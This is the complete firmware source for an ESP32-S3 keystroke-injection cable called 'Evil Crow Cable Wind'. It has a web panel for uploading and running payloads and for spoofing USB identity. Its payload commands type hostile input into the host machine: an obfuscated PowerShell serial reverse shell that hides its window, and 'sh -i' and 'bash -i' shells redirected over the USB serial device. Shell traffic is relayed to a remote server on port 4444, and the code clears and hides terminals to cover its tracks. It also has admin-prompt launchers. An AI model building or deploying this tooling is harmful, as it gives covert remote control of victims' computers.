#include <WiFiClient.h>
#include <WiFi.h>
#include <ESPmDNS.h>
#include <WiFiServer.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <HTTPUpdateServer.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "index.h"
#include "livepayload.h"
#include "uploadpayload.h"
#include "style.h"
#include "javascript.h"
#include "config.h"
#include "readfile.h"
#include "listpayloads.h"
#include <map>

// Config default SSID, password and channel
String ssid = "Evil Crow Cable Wind";   // Enter your SSID here
String password = "123456789";  //Enter your Password here
char *serverIP;
int serverPort = 4444;

// Global variables
String cmd;
char Command[255];
String tmp_key;
int payload_state = 0;
String livepayload;
bool payloadExecuted = false;
const bool formatOnFail = true;
String FileName;
String FileList;
String vendorID, productID, manufacturerName, productName;

File fsUploadFile;
WebServer controlserver(80);
WiFiServer tcpServer(12345);
WiFiClient clientServer;
HTTPUpdateServer httpUpdater;
USBCDC USBSerial;
USBHIDKeyboard Keyboard;

extern const unsigned char en_us[128];
extern const unsigned char es_es[128];
extern const unsigned char fr_fr[128];
extern const unsigned char it_it[128];
extern const unsigned char da_dk[128];
extern const unsigned char de_de[128];
extern const unsigned char hr_hr[128];
extern const unsigned char hu_hu[128];
extern const unsigned char pt_pt[128];
extern const unsigned char pt_br[128];
extern const unsigned char be_be[128];
extern const unsigned char br_br[128];
extern const unsigned char ca_ca[128];
extern const unsigned char ca_fr[128];
extern const unsigned char sk_sk[128];
extern const unsigned char cz_cz[128];
extern const unsigned char sv_se[128];
extern const unsigned char si_si[128];

std::map<String, const unsigned char *> layoutMap = {
  { "layout1", en_us },
  { "layout2", es_es },
  { "layout3", fr_fr },
  { "layout4", it_it },
  { "layout5", da_dk },
  { "layout6", de_de },
  { "layout7", hr_hr },
  { "layout8", hu_hu },
  { "layout9", pt_pt },
  { "layout10", pt_br },
  { "layout11", be_be },
  { "layout12", br_br },
  { "layout13", ca_ca },
  { "layout14", ca_fr },
  { "layout15", sk_sk },
  { "layout16", cz_cz },
  { "layout17", sv_se },
  { "layout18", si_si },
};

std::map<String, const unsigned char *> layoutMapInit = {
  { "EN_US", en_us },
  { "ES_ES", es_es },
  { "FR_FR", fr_fr },
  { "IT_IT", it_it },
  { "DA_DK", da_dk },
  { "DE_DE", de_de },
  { "HR_HR", hr_hr },
  { "HU_HU", hu_hu },
  { "PT_PT", pt_pt },
  { "PT_BR", pt_br },
  { "BE_BE", be_be },
  { "BR_BR", br_br },
  { "CA_CA", ca_ca },
  { "CA_FR", ca_fr },
  { "SK_SK", sk_sk },
  { "CZ_CZ", cz_cz },
  { "SV_SE", sv_se },
  { "SI_SI", si_si },
};

std::map<String, uint8_t> keyMap = {
  { "KEY_LEFT_ALT", KEY_LEFT_ALT },
  { "KEY_LEFT_GUI", KEY_LEFT_GUI },
  { "KEY_LEFT_CTRL", KEY_LEFT_CTRL },
  { "KEY_LEFT_SHIFT", KEY_LEFT_SHIFT },
  { "KEY_RIGHT_ALT", KEY_RIGHT_ALT },
  { "KEY_RIGHT_GUI", KEY_RIGHT_GUI },
  { "KEY_RIGHT_CTRL", KEY_RIGHT_CTRL },
  { "KEY_RIGHT_SHIFT", KEY_RIGHT_SHIFT },
  { "KEY_ENTER", KEY_RETURN },
  { "KEY_UP_ARROW", KEY_UP_ARROW },
  { "KEY_DOWN_ARROW", KEY_DOWN_ARROW },
  { "KEY_LEFT_ARROW", KEY_LEFT_ARROW },
  { "KEY_RIGHT_ARROW", KEY_RIGHT_ARROW },
  { "KEY_BACKSPACE", KEY_BACKSPACE },
  { "KEY_TAB", KEY_TAB },
  { "KEY_PAUSE", KEY_PAUSE },
  { "KEY_INSERT", KEY_INSERT },
  { "KEY_DELETE", KEY_DELETE },
  { "KEY_PAGE_UP", KEY_PAGE_UP },
  { "KEY_PAGE_DOWN", KEY_PAGE_DOWN },
  { "KEY_ESC", KEY_ESC },
  { "KEY_SPACE", KEY_SPACE },
  { "KEY_HOME", KEY_HOME },
  { "KEY_END", KEY_END },
  { "KEY_CAPS_LOCK", KEY_CAPS_LOCK },
  { "KEY_PRINT_SCREEN", KEY_PRINT_SCREEN },
  { "KEY_SCROLL_LOCK", KEY_SCROLL_LOCK },
  { "KEY_NUM_LOCK", KEY_NUM_LOCK },
  { "KEY_MENU", KEY_MENU },
  { "LED_NUMLOCK", LED_NUMLOCK },
  { "LED_CAPSLOCK", LED_CAPSLOCK },
  { "LED_SCROLLLOCK", LED_SCROLLLOCK },
  { "LED_COMPOSE", LED_COMPOSE },
  { "LED_KANA", LED_KANA },
  { "KEY_F1", KEY_F1 },
  { "KEY_F2", KEY_F2 },
  { "KEY_F3", KEY_F3 },
  { "KEY_F4", KEY_F4 },
  { "KEY_F5", KEY_F5 },
  { "KEY_F6", KEY_F6 },
  { "KEY_F7", KEY_F7 },
  { "KEY_F8", KEY_F8 },
  { "KEY_F9", KEY_F9 },
  { "KEY_F10", KEY_F10 },
  { "KEY_F11", KEY_F11 },
  { "KEY_F12", KEY_F12 }
};

void deleteFile(fs::FS &fs, const String &path) {
  if (fs.remove(path)) {
    controlserver.send(200, "text/plain", "File deleted successfully");
  } else {
    controlserver.send(500, "text/plain", "Failed to delete file");
  }
}

void readFile(fs::FS &fs, const String &path) {
  String payloadContent = "";

  File file = fs.open(path);
  if (!file || file.isDirectory()) {
    FileList = "Failed to open file";
    return;
  }
  while (file.available()) {
    payloadContent += file.readString();
  }
  file.close();

  if (path == "") {
    FileList = "File name is empty";
    return;
  }

  FileList = StaticFileList;
  FileList.replace("{{path}}", path);
  FileList.replace("{{payloadContent}}", payloadContent);

  livepayload = payloadContent;
}

void handleFileUpload() {
  HTTPUpload &upload = controlserver.upload();
  static const uint32_t MAX_FILE_SIZE = 204800; // 200KB limit (adjust as needed)
  static uint32_t totalUploaded = 0;

  if (upload.status == UPLOAD_FILE_START) {
    totalUploaded = 0; // Reset counter for new upload

    // First validate file type
    String filename = upload.filename;
    if (!filename.endsWith(".txt")) {
      controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Only .txt files allowed\"}");
      return;
    }

    // Check Content-Length header for size validation
    if (controlserver.hasHeader("Content-Length")) {
      uint32_t contentLength = controlserver.header("Content-Length").toInt();
      if (contentLength > MAX_FILE_SIZE) {
        controlserver.send(413, "application/json", "{\"status\":\"error\",\"message\":\"File too large (max 200KB)\"}");
        return;
      }
    }

    // Prepare file path
    if (!filename.startsWith("/")) {
      filename = "/payloads/" + filename;
    }

    // Create directory if needed
    if (!LittleFS.exists("/payloads")) {
      LittleFS.mkdir("/payloads");
    }

    // Try to open file
    fsUploadFile = LittleFS.open(filename, "w");
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Cannot create file\"}");
      return;
    }
  } 
  else if (upload.status == UPLOAD_FILE_WRITE) {
    // Check size during upload (defense in depth)
    totalUploaded += upload.currentSize;
    if (totalUploaded > MAX_FILE_SIZE) {
      fsUploadFile.close();
      LittleFS.remove(fsUploadFile.name());
      controlserver.send(413, "application/json", "{\"status\":\"error\",\"message\":\"File exceeded size limit\"}");
      return;
    }

    if (fsUploadFile) {
      fsUploadFile.write(upload.buf, upload.currentSize);
    }
  }
  else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      // Success response handled by POST handler
    }
  }
  else { // UPLOAD_FILE_ABORTED or error
    if (fsUploadFile) {
      fsUploadFile.close();
      LittleFS.remove(fsUploadFile.name());
    }
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Upload failed\"}");
  }
}

void listDir(fs::FS &fs, const char *dirname, uint8_t levels) {
  FileList = StaticListPayloads;

  File root = fs.open(dirname);
  if (!root || !root.isDirectory()) {
    FileList += "<br>Empty<br></body></html>";
    return;
  }

  File file = root.openNextFile();
  while (file) {
    String fileName = "/payloads/";
    fileName += file.name();
    FileList += "";
    FileList += "<a class=\"pyaloadButton\" href=\"/showpayload?payload=" + fileName + "\">" + fileName + "</a>" + "<br>";

    file = root.openNextFile();
  }
  FileList += "</body></html>";
}

void handleStats() {
  String json = "{";
  json += "\"uptime\":" + String(millis() / 1000);
  json += ",\"cpu0\":" + String(getCpuFrequencyMhz());
  json += ",\"cpu1\":" + String(getXtalFrequencyMhz());
  json += ",\"totalspiffs\":" + String(LittleFS.totalBytes());
  json += ",\"usedspiffs\":" + String(LittleFS.usedBytes());
  json += ",\"freespiffs\":" + String(LittleFS.totalBytes() - LittleFS.usedBytes());
  json += ",\"temperature\":" + String(temperatureRead());
  json += ",\"totalram\":" + String(ESP.getHeapSize());
  json += ",\"freeram\":" + String(ESP.getFreeHeap());
  json += "}";
  controlserver.send(200, "application/json", json);
}

// Function to get the currently selected layout
String getCurrentLayout() {
  String currentLayout = "layout1"; // Default to EN_US
  
  if (LittleFS.exists("/layout_config.txt")) {
    File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      currentLayout = fsUploadFile.readStringUntil('\n');
      currentLayout.trim();
      fsUploadFile.close();
    }
  }
  
  return currentLayout;
}

// Function to save the layout configuration to a file
void saveLayoutConfig(const String &layout) {
  File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_WRITE);
  if (!fsUploadFile) {
    controlserver.send(500, "text/plain", "Failed to open file for writing");
    return;
  }
  
  fsUploadFile.println(layout);
  fsUploadFile.close();
}

void payloadExec() {
  if (cmd.startsWith("RunMac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("RunLauncher ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 12);
  }

  else if (cmd.startsWith("RunNix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("RunWin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("ShellWin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    serverIP = Command + 9;

    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }

    delay(3000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.println("powershell");
    delay(1000);
    Keyboard.print("Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a, 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \"I\", \"f\", \"E\", \"x\", \"X\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \"exit\") { break }; $o = f \"$c\"; $p.WriteLine($o); $p.WriteLine(\"END_OF_COMMAND\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow");
    delay(1000);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("ShellNix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    serverIP = Command + 9;

    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }

    delay(3000);

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.println("sh -i > /dev/serial/by-id/*Espressif_Systems_ESP32S3* 2>&1 < /dev/serial/by-id/*Espressif_Systems_ESP32S3*");
  }

  else if (cmd.startsWith("ServerConnect ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    // the server IP is extracted from the Command array starting from the 14th index
    serverIP = Command + 14;

    // connect loop
    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }
  }

  else if (cmd.startsWith("ShellMac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    serverIP = Command + 9;

    // connect loop
    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }

    delay(3000);

    // run spotlight/alfred prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();

    delay(1000);
    // type terminal
    Keyboard.print("terminal");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // open new terminal tab, just in case there is terminal open with some chars - make greenlandi (press optin+t)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();

    // compressed payload
    Keyboard.println("sh -c 'D=$(ls -t /dev/cu.usbmodem* 2>/dev/null | head -n1) && exec 196<>$D; bash -i >&$D 0<&196 2>&196' &");

    // payload keyboard press event cleanup
    delay(100);
    Keyboard.releaseAll();

    // hide visible output on terminal
    Keyboard.println("clear");
    delay(100);
    Keyboard.releaseAll();

    // hide terminal (option+h)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("h");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("ShellMacCleanup")) {
    cmd.toCharArray(Command, cmd.length() + 1);

    delay(3000);

    // terminal cleanup - close tab

    // run spotlight/alfred prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();

    delay(1000);
    // type terminal
    Keyboard.print("terminal");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // cloease tab - option + w
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("w");
    delay(100);
    Keyboard.releaseAll();

    // enter, in case of alert window
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // hide terminal (option+h)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("h");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "AltF2") {
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "CtrlAltT") {
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "GuiR") {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "GuiSpace") {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("PrintLine ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.println(Command + 10);
  }

  else if (cmd.startsWith("Print ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.print(Command + 6);
  }

  else if (cmd.startsWith("Press ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 6;
    char key = tmp_key[0];
    cmd.remove(0, 6);

    if (keyMap.find(cmd) != keyMap.end()) {
      uint8_t keyCode = keyMap[cmd];
      Keyboard.press(keyCode);
    } else {
      uint8_t keyCode = (uint8_t)key;
      Keyboard.press(keyCode);
    }
  }

  else if (cmd.startsWith("PressRelease ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 13;
    char key = tmp_key[0];
    cmd.remove(0, 13);

    if (keyMap.find(cmd) != keyMap.end()) {
      uint8_t keyCode = keyMap[cmd];
      Keyboard.press(keyCode);
      delay(100);
      Keyboard.releaseAll();
    } else {
      uint8_t keyCode = (uint8_t)key;
      Keyboard.press(keyCode);
      delay(100);
      Keyboard.releaseAll();
    }
  }

  else if (cmd.startsWith("Release")) {
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("Delay ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(atoi(Command + 6));
  }

  else if (cmd.startsWith("RunPowershellAdmin")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("x");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("a");
    delay(3000);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("RunCmdAdmin")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("cmd");
    delay(2000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }
}

void handleUpdateWiFi() {
  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
    String newSSID = controlserver.arg("ssid");
    String newPassword = controlserver.arg("password");

    File fsUploadFile = LittleFS.open("/wifi_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to open file for writing\"}");
      return;
    }

    fsUploadFile.println(newSSID);
    fsUploadFile.println(newPassword);
    fsUploadFile.close();
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config applied successfully! Device will restart.\"}");
    delay(1000); // Give time for response to be sent
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
  }
}

void handleDeleteWiFiConfig() {
  if (LittleFS.exists("/wifi_config.txt")) {
    if (LittleFS.remove("/wifi_config.txt")) {
      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config deleted successfully\"}");
      delay(1000); // Give time for response to be sent
      ESP.restart();
    } else {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete the file\"}");
    }
  } else {
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"File does not exist\"}");
  }
}

void handleUpdateUSB() {
  if (controlserver.hasArg("vendorID") && controlserver.hasArg("productID") && controlserver.hasArg("productName") && controlserver.hasArg("manufacturerName")) {

    String vendorID = controlserver.arg("vendorID");
    String productID = controlserver.arg("productID");
    String productName = controlserver.arg("productName");
    String manufacturerName = controlserver.arg("manufacturerName");

    File fsUploadFile = LittleFS.open("/usb_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }

    fsUploadFile.println(vendorID);
    fsUploadFile.println(productID);
    fsUploadFile.println(productName);
    fsUploadFile.println(manufacturerName);
    fsUploadFile.close();
    controlserver.send(200, "text/plain", "USB config applied successfully! The device will restart.");
    ESP.restart();
  } else {
    controlserver.send(400, "text/plain", "Missing USB configuration data");
  }
}

void handleDeleteUSBConfig() {
  if (LittleFS.exists("/usb_config.txt")) {
    if (LittleFS.remove("/usb_config.txt")) {
      controlserver.send(200, "text/plain", "USB config deleted successfully");
      ESP.restart();
    } else {
      controlserver.send(500, "text/plain", "Failed to delete USB config file");
    }
  } else {
    controlserver.send(500, "text/plain", "USB config file does not exist");
  }
}

void handleLayout() {
  if (controlserver.hasArg("layout")) {
    String layout = controlserver.arg("layout");
    auto it = layoutMap.find(layout);

    if (it != layoutMap.end()) {
      Keyboard.setLayout(it->second);
      saveLayoutConfig(layout); // Save the layout selection
      controlserver.send(200, "text/plain", "Layout applied successfully!");
    } else {
      controlserver.send(400, "text/plain", "Invalid layout specified.");
    }
  } else {
    controlserver.send(400, "text/plain", "No layout specified.");
  }
}

void handleGetCurrentLayout() {
  String currentLayout = getCurrentLayout();
  controlserver.send(200, "text/plain", currentLayout);
}

void handleDeletePayload() {
  if (controlserver.hasArg("configmodule")) {
    String filenameToDelete = controlserver.arg("configmodule");
    if (filenameToDelete.length() > 0) {
      deleteFile(LittleFS, filenameToDelete);
    } else {
      controlserver.send(400, "text/plain", "File name is empty");
    }
  } else {
    controlserver.send(400, "text/plain", "Missing file name");
  }
}

void setup() {
  
  // LittleFS.begin(true);
  if (!LittleFS.begin(true)) {
    // format in case of missing file system
    LittleFS.format();
    delay(1000);
    ESP.restart();
  }

  if (LittleFS.exists("/usb_config.txt")) {
    File fsUploadFile = LittleFS.open("/usb_config.txt", FILE_READ);
    if (fsUploadFile) {
      String vendorID = fsUploadFile.readStringUntil('\n');
      vendorID.trim();
      String productID = fsUploadFile.readStringUntil('\n');
      productID.trim();
      String productName = fsUploadFile.readStringUntil('\n');
      productName.trim();
      String manufacturerName = fsUploadFile.readStringUntil('\n');
      manufacturerName.trim();
      fsUploadFile.close();
      USB.VID(strtol(vendorID.c_str(), nullptr, 16));
      USB.PID(strtol(productID.c_str(), nullptr, 16));
      USB.manufacturerName(manufacturerName.c_str());
      USB.productName(productName.c_str());
    }
  }

  Keyboard.begin();
  USB.begin();
  USBSerial.begin();

  // Load the saved layout if it exists
  const unsigned char *selected_layout = en_us; // Default to EN_US
  
  if (LittleFS.exists("/layout_config.txt")) {
    File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      String layoutKey = fsUploadFile.readStringUntil('\n');
      layoutKey.trim();
      
      auto it = layoutMap.find(layoutKey);
      if (it != layoutMap.end()) {
        selected_layout = it->second;
      }
      
      fsUploadFile.close();
    }
  }

  Keyboard.setLayout(selected_layout);

  if (LittleFS.exists("/payloads/payload-startup.txt")) {
    File fsUploadFile = LittleFS.open("/payloads/payload-startup.txt", FILE_READ);
    if (fsUploadFile) {
      livepayload = fsUploadFile.readString();
      int layoutPos = livepayload.indexOf("# Layout: ");
      const unsigned char *selected_layout = en_us;

      if (layoutPos != -1) {
        int start = layoutPos + 10;
        int end = livepayload.indexOf('\n', start);
        if (end == -1) {
          end = livepayload.length();
        }
        String tmp_layout = livepayload.substring(start, end);
        tmp_layout.trim();

        if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {
          selected_layout = layoutMapInit[tmp_layout];
        }
      }
      //Keyboard.begin();
      //USB.begin();
      Keyboard.setLayout(selected_layout);

      payload_state = 1;
      payloadExecuted = false;
    }
  } /*else {
    Keyboard.begin();
    USB.begin();
    Keyboard.setLayout(en_us);
  }*/

  // Disabled and move up in code due stability issues
  // USBSerial.begin();

  if (LittleFS.exists("/wifi_config.txt")) {
    File fsUploadFile = LittleFS.open("/wifi_config.txt", FILE_READ);
    if (fsUploadFile) {
      ssid = fsUploadFile.readStringUntil('\n');
      ssid.trim();
      password = fsUploadFile.readStringUntil('\n');
      password.trim();
      fsUploadFile.close();
    }
  }

  WiFi.begin(ssid.c_str(), password.c_str());

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
  }

  if (!MDNS.begin("cable-wind")) {
    while (1) {
      delay(1000);
    }
  }

  tcpServer.begin();

  {
    File root = LittleFS.open("/payloads/");
    if (root && root.isDirectory()) {
      File file = root.openNextFile();
      while (file) {
        String fileName = file.name();
        size_t fileSize = file.size();
        file = root.openNextFile();
      }
    }
  }

  delay(3000);

  controlserver.on("/", []() {
    controlserver.send_P(200, "text/html", Index);
  });

  controlserver.on("/stats", handleStats);

  controlserver.on("/livepayload", []() {
    controlserver.send_P(200, "text/html", LivePayload);
  });

  controlserver.on("/uploadpayload", []() {
    controlserver.send_P(200, "text/html", UploadPayload);
  });

  controlserver.on("/config", []() {
    controlserver.send_P(200, "text/html", Configuration);
  });

  controlserver.on(
  "/upload", HTTP_POST, []() {
    // Only called if the upload completed successfully
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"File uploaded successfully\"}");
  },
  handleFileUpload);

  controlserver.on("/listpayloads", []() {
    listDir(LittleFS, "/payloads", 0);
    controlserver.send(200, "text/html", FileList);
  });

  controlserver.on("/showpayload", []() {
    String fileName = controlserver.arg("payload");
    readFile(LittleFS, fileName);
    controlserver.send(200, "text/html", FileList);
  });

  controlserver.on("/style.css", []() {
    controlserver.send_P(200, "text/css", Style);
  });

  controlserver.on("/javascript.js", []() {
    controlserver.send_P(200, "application/javascript", Redirect);
  });

  controlserver.on("/dopayload", []() {
    if (livepayload != "") {
      payload_state = 1;
      payloadExecuted = false;
    }
    controlserver.send(200, "text/plain", "Payload running...");
  });

  controlserver.on("/runlivepayload", []() {
    livepayload = controlserver.arg("livepayload");
    if (controlserver.arg("configmodule")) {
      payload_state = 1;
      payloadExecuted = false;
    }
    controlserver.send(200, "text/plain", "Payload running...");
  });

  controlserver.on("/runlivestartup", []() {
    String payload_startup = controlserver.arg("livepayload");
    String fileName = "payload-startup.txt";
    String filePath = "/payloads/" + fileName;

    if (!LittleFS.exists("/payloads")) {
      LittleFS.mkdir("/payloads");
    }

    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }

    fsUploadFile.print(payload_startup);
    fsUploadFile.close();

    payloadExecuted = true;
    controlserver.send(200, "text/plain", "Payload saved");
  });

  controlserver.on("/runlivesave", HTTP_POST, []() {
    String payload_save;
    payload_save = controlserver.arg("livepayload");
    String fileName;

    int namePos = payload_save.indexOf("# Name: ");
    if (namePos != -1) {
      int start = namePos + 8;
      int end = payload_save.indexOf('\n', start);
      if (end == -1) {
        end = payload_save.length();
      }
      fileName = payload_save.substring(start, end);
      fileName.trim();
    }

    if (fileName.length() == 0 || fileName.indexOf('/') != -1) {
      const char charset[] = "abcdefghijklmnopqrstuvwxyz1234567890";
      fileName = "livepayload-";
      for (int i = 0; i < 8; i++) {
        fileName += charset[random(0, 26)];
      }
      fileName += ".txt";
    }

    String filePath = "/payloads/" + fileName;

    if (!LittleFS.exists("/payloads")) {
      LittleFS.mkdir("/payloads");
    }

    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }
    fsUploadFile.print(payload_save);
    fsUploadFile.close();

    payloadExecuted = true;
    controlserver.send(200, "text/plain", "Payload saved");
  });

  controlserver.on("/payloadstatuspayload", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/payloadstatusstartup", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/payloadstatussave", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/updatewifi", HTTP_POST, handleUpdateWiFi);
  controlserver.on("/layout", HTTP_POST, handleLayout);
  controlserver.on("/deletewificonfig", HTTP_POST, handleDeleteWiFiConfig);
  controlserver.on("/updateusb", HTTP_POST, handleUpdateUSB);
  controlserver.on("/deleteusbconfig", HTTP_POST, handleDeleteUSBConfig);
  controlserver.on("/deletepayload", HTTP_POST, handleDeletePayload);
  controlserver.on("/getcurrentlayout", handleGetCurrentLayout);

  httpUpdater.setup(&controlserver);
  controlserver.begin();
}

void loop() {
  controlserver.handleClient();
  vTaskDelay(1);

  while (USBSerial.available()) {
    String data = USBSerial.readString();
    clientServer.print(data);
  }

  while (clientServer.available()) {
    String data = clientServer.readString();
    USBSerial.print(data);
  }

  if (payload_state == 1) {
    char *splitlines;
    int payloadlen = livepayload.length() + 1;
    char request[payloadlen];
    livepayload.toCharArray(request, payloadlen);
    splitlines = strtok(request, "\r\n");

    while (splitlines != NULL) {
      cmd = splitlines;
      payloadExec();
      splitlines = strtok(NULL, "\r\n");
      vTaskDelay(1);
    }

    payload_state = 0;
    cmd = "";
    livepayload = "";
    payloadExecuted = true;
  }
  vTaskDelay(1);
}